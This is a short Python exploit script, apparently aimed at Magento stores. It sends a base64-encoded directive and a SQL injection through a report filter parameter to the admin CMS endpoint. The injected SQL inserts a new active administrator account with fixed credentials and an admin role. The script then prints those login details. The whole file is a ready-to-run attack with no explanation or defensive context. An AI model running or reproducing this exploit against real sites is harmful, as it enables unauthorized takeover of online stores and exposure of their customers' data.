import requests
import base64
import sys

def main():
    if len(sys.argv) < 2:
        print("Usage: script.py <target>")
        sys.exit(1)

    target = sys.argv[1]

    if not target.startswith("http"):
        target = "http://" + target

    if target.endswith("/"):
        target = target[:-1]

    target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

    SQLQUERY = """
    SET @SALT = 'rp';
    SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
    SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
    INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
    INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
    """

    # Insert the username and password into the SQL query
    query = SQLQUERY.replace("\n", "").format(username="ypwq", password="123")
    pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

    # Base64 encoding the payload
    payload = "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"
    encoded_filter = base64.b64encode(pfilter.encode('utf-8')).decode('utf-8')

    # Making the POST request
    r = requests.post(target_url, 
                      data={"___directive": payload,
                            "filter": encoded_filter,
                            "forwarded": 1})

    if r.ok:
        print("WORKED")
        print(f"Check {target}/admin with creds ypwq:123")
    else:
        print("DID NOT WORK")

if __name__ == "__main__":
    main()
